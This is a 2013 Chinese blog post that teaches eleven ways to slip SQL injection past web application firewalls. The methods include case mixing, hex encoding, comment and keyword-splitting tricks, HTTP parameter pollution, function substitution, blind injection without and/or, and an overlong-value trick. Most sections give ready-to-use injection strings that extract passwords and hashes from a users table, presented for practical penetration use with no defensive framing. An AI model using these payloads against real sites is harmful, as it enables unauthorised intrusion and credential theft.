---
title: SQL注入中的WAF绕过技术
tags:
  - php
  - 安全
  - 软件
id: 2551
categories:
  - 学习笔记
date: 2013-01-06 13:15:37
---

作者：bystander
博客：[http://leaver.me](http://leaver.me/)
论坛：法克论坛

目录

1.<span style="font-family: 宋体;">大小写绕过</span>

2.<span style="font-family: 宋体;">简单编码绕过</span>

3.<span style="font-family: 宋体;">注释绕过</span>

4.<span style="font-family: 宋体;">分隔重写绕过</span>

5.Http<span style="font-family: 宋体;">参数污染</span>(HPP)

6.<span style="font-family: 宋体;">使用逻辑运算符</span> or /and<span style="font-family: 宋体;">绕过</span>

7.<span style="font-family: 宋体;">比较操作符替换</span>

8.<span style="font-family: 宋体;">同功能函数替换</span>

9.<span style="font-family: 宋体;">盲注无需</span>or<span style="font-family: 宋体;">和</span>and

10.<span style="font-family: 宋体;">加括号</span>

11.缓冲区溢出绕过

<span style="font-size: large;"><span style="color: #0000ff;">1\. 大小写绕过</span></span>
这个大家都很熟悉，对于一些太垃圾的WAF效果显著，比如拦截了union,那就使用Union UnIoN等等。绕过

<span style="font-size: large;"><span style="color: #0000ff;">2.  简单编码绕过</span></span>
比如WAF检测关键字，那么我们让他检测不到就可以了。比如检测union,那么我们就用%55 也就是U的16进制编码来代替U, union写成 %55nION，结合大小写也可以绕过一些WAF，你可以随意替换一个或几个都可以。。

也还有大家在Mysql注入中比如表名或是load文件的时候，会把文件名或是表明用16进制编码来绕过WAF都是属于这类。

<span style="font-size: large;"><span style="color: #0000ff;">3.  注释绕过</span></span>
这种情况比较少，适用于WAF只是过滤了一次危险的语句，而没有阻断我们的整个查询
<div>
> /?id=1+union+select+1,2,3/*
</div>
比如对于上面这条查询，WAF过滤了一次union和select，那么我们在之前在写一个注释的语句，让他把注释里面的过滤掉，，并不影响我们的查询。。
所以绕过语句就是：
<div>
> /?id=1/*union*/union/*select*/select+1,2,3/*
</div>
还有一种和注释有关的绕过：
比如
<div>
> index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3,4….
</div>
可以看到，只要我们把敏感词放到注释里面，注意，前面要加一个！

<span style="font-size: large;"><span style="color: #0000ff;">4.   分隔重写绕过</span></span>
还是上面的例子，适用于那种WAF采用了正则表达式的情况，会检测所有的敏感字，而不在乎你写在哪里，有几个就过滤几个。。
我们可以通过注释分开敏感字,这样WAF的正则不起作用了，而带入查询的时候并不影响我们的结果
<div>
> /?id=1+un/**/ion+sel/**/ect+1,2,3--
</div>
至于重写绕过，适用于WAF过滤了一次的情况，和我们上传aaspsp马的原理一样，我们可以写出类似Ununionion这样的。过滤一次union后就会执行我们的查询了
<div>
> ?id=1 ununionion select 1,2,3--
</div>
<span style="font-size: large;"><span style="color: #0000ff;">5.   Http参数污染(HPP)</span></span>
比如我们有这样的语句：
<div>
> /?id=1 union select+1,2,3+from+users+where+id=1--
</div>
我们可以重复一次前面的id值添加我们的值来绕过，&amp;id=会在查询时变成逗号
<div>
> /?id=1 union select+1&amp;id=2,3+from+users+where+id=1--
</div>
这种情况成功的条件比较多，取决于具体的WAF实现。。

再给出一个例子说明用法
<div>
> /?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users--
</div>
具体分析的话就涉及到查询语句的后台代码的编写了。
比如服务器是这样写的：
<div>
> select * from table where a=".$_GET['a']." and b=".$_GET['b']." limit ".$_GET['c'];
</div>
那我们可以构造这样的注入语句：
<div>
> /?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--
</div>
最终解析为：
<div>
> select * from table where a=1 union/* and b=*/select 1,pass/*limit */from users--
</div>
可以看到，这种方式其实比较适合白盒测试，而对于黑盒渗透的话，用起来比较麻烦。但是也可以一试。

<span style="font-size: large;"><span style="color: #0000ff;">6\. 使用逻辑运算符 or /and绕过</span></span>
<div>
> /?id=1+OR+0x50=0x50
> /?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
</div>
顺便解释一下第二句话，从最里面的括号开始分析，select+pwd+from+users+limit+1,1 这句是从users表里查询pwd字段的第一条记录，比如是admin，
然后mid(上一句),1,1就是取admin的第一个字符，也就是a，
lower(上一句)就是把字符转换为小写，
然后ascii就是把a转换成ascii码，看等不等于74.

<span style="font-size: large;"><span style="color: #0000ff;">7.  比较操作符替换</span></span>
包括!= 不等于，&lt;&gt;不等于，&lt; 小于，&gt;大于，这些都可以用来替换=来绕过，
比如上一个例子，要判断是不是74，假设=被过滤，那么我们可以判断是不是大于73，是不是小于75，然后就知道是74了。。很多WAF都会忘了这个。

<span style="font-size: large;"><span style="color: #0000ff;">8.  同功能函数替换</span></span>
Substring()可以用mid(),substr()这些函数来替换，都是用来取字符串的某一位字符的。
Ascii()编码可以用hex(),bin(),也就是16进制和二进制编码替换
Benchmark() 可以用sleep()来替换，这两个使用在基于延时的盲注中，有机会给大家介绍
如果连这些都屏蔽了，还有一种新的方法
<div>
> substring((select 'password'),1,1) = 0x70
> substr((select 'password'),1,1) = 0x70
> mid((select 'password'),1,1) = 0x70
</div>
比如这三条，都是从password里判断第一个字符的值，可以用
<div>
> strcmp(left('password',1), 0x69) = 1
> strcmp(left('password',1), 0x70) = 0
> strcmp(left('password',1), 0x71) = -1
</div>
来替换，left用来取字符串左起1位的值，strcmp用来比较两个值，如果比较结果相等就为0，左边小的话就为-1，否则为1
还有我前几篇说过的group_concat 和concat和concat_ws也可以互相替换

<span style="font-size: large;"><span style="color: #0000ff;">9.    盲注无需or和and</span></span>
比如有这样一个注入点：
<div>
> index.php?uid=123
</div>
and or 被过滤了，其实有一种更直接的方法，我们直接修改123为我们的语句生成的，
<div>
> index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123
</div>
123的时候页面是正确的，我们现在在盲猜hash的第一位，如果第一位等于0x42也就是B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是B，就这样猜，不用and 和or了。。

<span style="font-size: large;"><span style="color: #0000ff;">10\. 加括号</span></span>
<div>
> /?id=1+union+(select+1,2+from+users)
</div>
比如，上面这一条被WAF拦截了。可以试试加一些括号
<div>
> /?id=1+union+(select+1,2+from+xxx)
> /?id=(1)union(select(1),mid(hash,1,32)from(users))
> /?id=1+union+(select'1',concat(login,hash)from+users)
> /?id=(1)union(((((((select(1),hex(hash)from(users))))))))
> /?id=(1)or(0x50=0x50)
</div>
最后，个人能力毕竟有限，有些也一时想不起，想起来的话再补充。同时欢迎大家指正，补充。

<span style="font-size: large;"><span style="color: #0000ff;">11.缓冲区溢出绕过</span></span>
刚刚写着把这个给忘了。这个是从国外一个博客看到的。
<div>
> id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
> ,27,28,29,30,31,32,33,34,35,36–+
</div>
其中<span>0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般要求1000个以上</span>